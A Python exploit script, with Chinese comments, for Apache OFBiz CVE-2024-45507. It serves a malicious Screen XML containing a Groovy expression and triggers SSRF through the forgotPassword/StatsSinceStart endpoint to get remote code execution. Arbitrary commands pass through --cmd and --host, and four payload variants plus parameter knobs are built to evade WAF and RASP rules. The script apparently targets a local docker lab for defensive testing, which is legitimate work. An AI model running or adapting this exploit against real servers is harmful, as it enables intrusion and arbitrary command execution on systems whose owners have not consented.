# -*- coding: utf-8 -*-
"""Apache OFBiz CVE-2024-45507（SSRF → Groovy RCE）exp。

官方 seed：POST /webtools/control/forgotPassword/StatsSinceStart，
statsDecoratorLocation=http://attacker/payload.xml（恶意 Screen XML，
<set value="${groovy:...}"/> 在服务端求值 → 任意代码执行）。
本机攻击基础设施：infra 容器（python http.server，docker 网络名 infra，
宿主 127.0.0.1:19080），payload XML 写入 infrastructure/www/payloads/。

预留变异旋钮（WAF/RASP 轮用）：
  --stage      ssrf（仅探测 SSRF，回连 infra 上的标记文件）| rce
  --variant    groovy 执行形态 v1 execute() / v2 数组 execute / v3 new File 写文件 /
               v4 字符串拼接拆分（对抗内容规则）
  --param      参数名（默认 statsDecoratorLocation）
  --uri        请求路径（默认 /webtools/control/forgotPassword/StatsSinceStart）
  --scheme     载荷 URL 协议 http（file 等留待 RASP 轮实测）
"""
import argparse
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common import session  # noqa: E402

GROOVY_VARIANTS = {
    "v1": "'{cmd}'.execute()",
    "v2": "[\"/bin/sh\",\"-c\",\"{cmd}\"] .execute()",
    "v3": "new File('/tmp/pwn_ofbiz_' + System.currentTimeMillis()).text = '{cmd}'",
    "v4": "('to'+'uch /tmp/pwn_ofbiz_rce').execute()",
}

XML_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">

    <screen name="StatsDecorator">
        <section>
            <actions>
                <set value="${{groovy:{expr}}}"/>
            </actions>
        </section>
    </screen>
</screens>
"""


def build_xml(variant, cmd):
    if variant == "v4":
        expr = GROOVY_VARIANTS[variant]
    else:
        expr = GROOVY_VARIANTS[variant].replace("{cmd}", cmd)
    return XML_TEMPLATE.format(groovy="groovy:", expr=expr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18081, help="18081=裸https / 18381=WAF https")
    ap.add_argument("--stage", choices=["ssrf", "rce"], default="rce")
    ap.add_argument("--uri", default="/webtools/control/forgotPassword/StatsSinceStart")
    ap.add_argument("--param", default="statsDecoratorLocation")
    ap.add_argument("--payload-url", default=None)
    ap.add_argument("--variant", default="v1", choices=sorted(GROOVY_VARIANTS))
    ap.add_argument("--cmd", default="touch /tmp/pwn_ofbiz_r1")
    ap.add_argument("--tag", default=None, help="payload 文件名标签")
    a = ap.parse_args()

    url = "https://%s:%d%s" % (a.host, a.port, a.uri)
    s = session()

    if a.stage == "ssrf":
        target = a.payload_url or "http://infra:8000/hello.txt"
        print("[*] SSRF 探测 -> %s" % target)
        r = s.post(url, data={a.param: target},
                   headers={"User-Agent": "Mozilla/5.0"}, timeout=30)
        print("[*] POST %s -> HTTP %s (%d bytes)" % (url, r.status_code, len(r.content)))
        print("[*] SSRF 是否命中看 infra 访问日志: docker compose logs infra --tail 5")
        return

    tag = a.tag or ("r%d_%s" % (int(time.time()), a.variant))
    fname = "ofbiz_%s.xml" % tag
    xml = build_xml(a.variant, a.cmd)
    www = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                        "..", "..", "infrastructure", "www", "payloads"))
    os.makedirs(www, exist_ok=True)
    path = os.path.join(www, fname)
    with open(path, "w", encoding="utf-8") as f:
        f.write(xml)
    print("[*] 恶意 Screen XML -> infrastructure/www/payloads/%s" % fname)

    payload_url = a.payload_url or "http://infra:8000/payloads/%s" % fname
    print("[*] RCE 变体=%s 载荷URL=%s cmd=%s" % (a.variant, payload_url, a.cmd))
    r = s.post(url, data={a.param: payload_url},
               headers={"User-Agent": "Mozilla/5.0"}, timeout=30)
    print("[*] POST %s -> HTTP %s (%d bytes)" % (url, r.status_code, len(r.content)))
    print("[*] 真值核查（另开终端）: docker compose --profile ofbiz exec ofbiz ls -l --full-time /tmp")


if __name__ == "__main__":
    main()
